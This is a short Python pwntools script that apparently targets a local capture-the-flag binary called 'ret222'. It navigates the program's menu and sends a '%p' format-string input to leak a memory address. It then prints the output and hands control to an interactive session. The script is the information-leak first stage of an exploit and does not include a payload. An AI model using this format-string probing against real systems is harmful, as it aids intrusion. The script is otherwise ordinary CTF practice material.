#!/usr/bin/env python

from pwn import *

r = process('./ret222')
raw_input('#')

r.recvuntil('> ')
r.sendline('1')
r.recvuntil(':')
r.sendline('%p')
r.recvuntil('> ')
r.sendline('2')
print r.recv()

r.interactive()
